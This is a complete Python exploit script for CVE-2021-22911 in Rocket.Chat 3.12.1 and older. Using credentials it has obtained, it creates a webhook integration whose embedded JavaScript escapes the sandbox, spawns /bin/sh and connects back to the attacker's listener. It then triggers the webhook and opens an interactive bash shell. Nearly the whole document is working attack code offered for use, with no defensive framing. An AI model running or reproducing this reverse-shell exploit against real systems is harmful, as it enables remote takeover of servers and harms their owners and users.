# Title: Authenticated RocketChat 3.12.1 Reverse Shell
# Author: enox, modified by Sleepwalkr
# Date: 26-04-2022
# Product: Rocket.Chat
# Vendor: https://rocket.chat/
# Vulnerable Version(s): Rocket.Chat 3.12.1 and older (tested on 2.4.14)
# CVE: CVE-2021-22911
# Credits: https://blog.sonarsource.com/nosql-injections-in-rocket-chat, https://github.com/CsEnox/CVE-2021-22911, https://www.exploit-db.com/exploits/50108
# Info: Quick exploit to get a reverse shell if credentials were adquired.
# Usage: python3 exploit.py -t <TARGET URL> -u <USERNAME> -p <PASSWORD> -i <LOCAL IP> -l <LOCAL PORT>
# Requirements: This exploit uses pwntools > pip install pwn

#!/usr/bin/python3

import requests
import json
import argparse
from pwn import *

parser = argparse.ArgumentParser(description='Autenthicated RocketChat 3.12.1 Reverse Shell')
parser.add_argument('-t', help='Target URL (Eg: http://rocketchat.local)', required=True)
parser.add_argument('-u', help='RocketChat Username (Eg: admin)', required=True)
parser.add_argument('-p', help='RocketChat Password (Eg: 12345)', required=True)
parser.add_argument('-i', help='Local Listener IP (Eg: 10.10.14.15', required=True)
parser.add_argument('-l', help='Local Listener Port (Eg: 1234, default port=9000)', default=9000, type=int)
args = parser.parse_args()

target = args.t
port = args.l
user = args.u
passw = args.p
ip = args.i

def rce(url):

	# Authenticating
	headers={'content-type': 'application/json'}
	payload = '{ "user": "'+user+'", "password": "'+passw+'" }'
	r = requests.post(url + "/api/v1/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)
	data =(data['data'])
	userid = data['userId']
	token = data['authToken']
	print("[+] Succesfully authenticated as administrator")

	# Creating Integration
	payload = '{"enabled":true,"channel":"#general","username":"'+user+'","name":"rce","type":"webhook-incoming","scriptEnabled":true,"script":"const require = console.log.constructor(\'return process.mainModule.require\')(); var net = require(\'net\'), cp = require(\'child_process\'), sh = cp.spawn(\'/bin/sh\', []); var client = new net.Socket(); client.connect('+str(port)+', \''+ip+'\', function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });"}'
	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	data = json.loads(r.text)
	data =(data['integration'])
	token = data['token']
	_id = data['_id']
	print("[+] Sending Payload")
		
	# Triggering RCE
	u = url + '/hooks/' + _id + '/' +token
	print("[+] Webhook address: "+u)
	shell = listen(port, timeout=1).wait_for_connection()
	r = requests.get(u)
	print("[+] Triggering Reverse Shell")
	shell.sendline("bash -p")
	shell.interactive()

############################################################

print("[*] Starting Script")
rce(target)
